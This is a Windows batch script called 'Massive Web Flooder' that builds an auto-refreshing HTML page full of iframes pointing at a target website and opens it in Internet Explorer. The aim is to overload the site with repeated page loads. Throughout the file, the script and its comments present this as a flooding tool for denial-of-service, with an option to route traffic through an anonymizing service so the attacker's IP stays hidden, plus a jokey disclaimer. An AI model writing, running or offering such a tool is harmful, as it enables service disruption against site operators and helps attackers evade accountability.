@echo off

::Massive Web Flooder (MWF) 1.1 was created by El-Trucha.
::This program's first version was coded on Saturday 11/20/04.
::Special thanks to:
::My friend mcfuzzhead for the HTML code.
::Computing.Net people for all the help they gave me with Batch.
::Anonymization.Net for having their wonderful anonymization service.
::Please note that Internet Explorer is required to run this program properly.

::This is the program's syntax:
:: mwf webpage times_to_be_loaded [-h]
::Example:
:: mwf www.ventilator.com 43 -h
::That will flood the webpage "www.ventilator.com" 43 times in each refresh,
::and will visit it through Anonymization.Net, so nobody will know your real IP...:P
::Remember that the -h switch is OPTIONAL, but it's recommended if you don't
::have a proxy...

::What do you mean a "refresh"??
::Yes...this program will load the page as many times as you want in a single HTML
::page, in 50x50 boxes...:P
::This program may take a long time to complete load a single HTML page, so go do
::something else while it loads and reloads, the longer you leave, the more it will flood...





::I'm checking if the user put in all the command line options, setting the flood page, checking if
::the user selected anonymous flooding, and then setting the variables...
if "%1"=="" goto error
if "%2"=="" goto error
set flood=%temp%\flood.html
if "%3"=="-h" set page=http://www.anonymization.net/http://%1
if not "%3"=="-h" set page=http://%1
set times=%2

::Here I delete the flood page if it already exists and explain some things to the user...
:start
if exist %flood% del %flood%
cls
echo This program will flood the page called
echo "%page%"
echo %times% times in each refresh.
echo (It will refresh after the webpage is loaded %times%
echo times inside the flood page.)
echo Please check the URL for mispellings/syntax errors.
echo Also make sure that you did not put HTTP:// on
echo the command line, on the second option...
if "%3"=="-h" call :proxymsg-good
if not "%3"=="-h" call :proxymsg-bad
echo.
echo **I AM NOT RESPONSIBLE FOR YOUR FLOODING!!!!!**
echo.
pause

::Here I make the flood page.
:makepage
echo.
echo Making flood HTML page...
echo.
echo ^<META HTTP-EQUIV="refresh" CONTENT="1;"^> >>%flood%
for /L %%a in (0,1,%times%) do call :do- %%a

::More explaining stuff...
:donemakingpage
echo Done making flood HTML page!!
echo Press any key to start flooding...
echo Feel free to go do something else in the meanwhile,
echo while it loads and reloads...the longer you go,
echo the more it will flood...
echo Remember that if you don't let this program sit for at least
echo 5 minutes it will NOT flood anything...
pause >nul

::Time to flood!! :D
:flood
start /w iexplore %flood%
del %flood%
cls
echo Done!! You just massively flooded
echo %page%!!
echo YOU MEAN PERSON!!!!!!!!! :@
echo.


:end
goto end2

:error
cls
echo You did not set all the command line options...
echo Open this Batch file with Notepad to read
echo more about the program's syntax...
echo.
pause
goto end2

:proxymsg-good
echo You have selected to hide your PC information using
echo Anonymization.Net, so you don't need a proxy...
goto end2

:proxymsg-bad
echo You didn't use the -h switch at the end, so I recommend
echo using a proxy now!!
goto end2

:do-
echo ^<iframe src="%page%" height=50% width=50%^>^</iframe^> >>%flood%

:end2